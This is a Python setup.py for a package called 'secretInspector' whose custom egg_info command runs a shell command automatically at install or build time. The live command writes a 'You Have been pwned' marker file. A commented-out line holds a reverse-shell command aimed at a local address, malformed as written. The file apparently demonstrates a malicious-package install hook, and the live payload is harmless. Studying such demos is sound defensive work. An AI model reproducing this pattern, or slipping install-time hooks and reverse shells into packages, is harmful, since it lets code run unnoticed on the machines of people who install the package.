# setup.py
from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info
import os

class RunEggInfoCommand(egg_info):
    def run(self):
        os.system("echo 'You Have been pwned' > /tmp/pwned")
	#os.system("bash -i >& /dev/127.0.0.1/1234/ 0>&1")
        egg_info.run(self)

setup(
    name="secretInspector",  # Package name
    version="0.1.0",   # Initial version
    packages=find_packages(),  # Include all Python packages
    cmdclass={
        'egg_info': RunEggInfoCommand
    },
    description="very interesting secret inspection module",
    long_description=open('README.md').read(),  # Optional: read from README.md
    long_description_content_type="text/markdown",  # Optional: Specify the format of README
    author="jake",
    author_email="jake46@example.com",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',  # Specify Python version requirements
)

